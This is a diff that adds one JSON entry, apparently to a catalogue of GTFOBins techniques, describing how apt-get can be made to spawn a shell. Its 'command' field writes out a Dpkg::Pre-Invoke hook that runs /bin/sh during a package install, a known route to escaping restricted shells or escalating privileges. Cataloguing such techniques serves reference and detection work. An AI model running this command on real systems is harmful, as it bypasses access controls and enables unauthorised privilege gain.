@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-apt-get-shell-1",
+  "name": "GTFOBins · apt-get (shell) #1",
+  "command": "echo 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' >/path/to/temp-file\napt-get -y install -c /path/to/temp-file sl",
+  "description": "Use apt-get to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "apt-get",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/apt-get/#shell",
+  "upstream_id": "apt-get/shell/0",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/apt-get/"
+    }
+  ]
+}
